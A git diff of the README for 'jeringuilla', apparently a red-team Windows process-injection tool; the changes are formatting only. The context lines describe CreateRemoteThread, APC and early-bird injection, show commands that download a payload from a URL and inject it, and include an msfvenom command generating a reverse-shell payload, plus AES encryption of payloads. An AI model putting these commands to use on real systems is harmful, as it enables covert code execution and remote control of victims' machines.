@@ -24,8 +24,9 @@ jeringuilla is a tool for easy process injection. It implements several types of
 Link: [https://github.com/ricardojoserf/jeringuilla](https://github.com/ricardojoserf/jeringuilla)
 
 --------------------------------------
+<br><br><br>
 
-### List process
+## List process
 
 Option "list" to enumerate all processes or filter by name or owner:
 
@@ -48,8 +49,9 @@ jeringuilla.exe list "DESKTOP-MA54241\ricardo"
 ![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jeringa/Screenshot_1.png)
 
 --------------------------------------
+<br><br><br>
 
-###  Injection type "inject-crt" (OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread)
+##  Injection type "inject-crt" (OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread)
 
 You can use the process name and owner, or the PID. The payload can be in HEX format or a url to download it, if not the program asks for a value/url.
 
@@ -73,8 +75,10 @@ jeringuilla.exe inject-crt 9408 http://127.0.0.1/payload.bin
 ![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jeringa/Screenshot_3.png)
 
 --------------------------------------
+<br><br><br>
 
-###  Injection type "inject-apc" (OpenProcess + VirtualAllocEx + WriteProcessMemory + OpenThread + QueueUserAPC)
+
+##  Injection type "inject-apc" (OpenProcess + VirtualAllocEx + WriteProcessMemory + OpenThread + QueueUserAPC)
 
 You can use the process name and owner, or the PID. The payload can be in HEX format or a url to download it, if not the program asks for a value/url. 
 
@@ -98,8 +102,9 @@ jeringuilla.exe inject-apc 1234 http://127.0.0.1/payload.bin
 
 
 --------------------------------------
+<br><br><br>
 
-###  Injection type "earlybird" (CreateProcess + VirtualAllocEx + WriteProcessMemory + ResumeThread)
+##  Injection type "earlybird" (CreateProcess + VirtualAllocEx + WriteProcessMemory + ResumeThread)
 
 You only set the program path. The payload can be in HEX format or a url to download it, if not the program asks for a value/url.
 
@@ -122,8 +127,9 @@ jeringuilla.exe earlybird "c:\windows\system32\calc.exe" http://127.0.0.1/payloa
 ```
 
 --------------------------------------
+<br><br><br>
 
-### Payload generation
+## Payload generation
 
 You can use your custom payloads or use Msfvenom. In case you use the HEX payload option you must delete all "\x" or similar characters. If you use the url option the payload must be in RAW format.
 
@@ -140,8 +146,9 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=th
 ```
 
 --------------------------------------
+<br><br><br>
 
-### AES Encryption
+## AES Encryption
 
 Both the HEX and RAW payloads in previous examples can be encrypted using AES with payloadEncryptor.exe. 
 
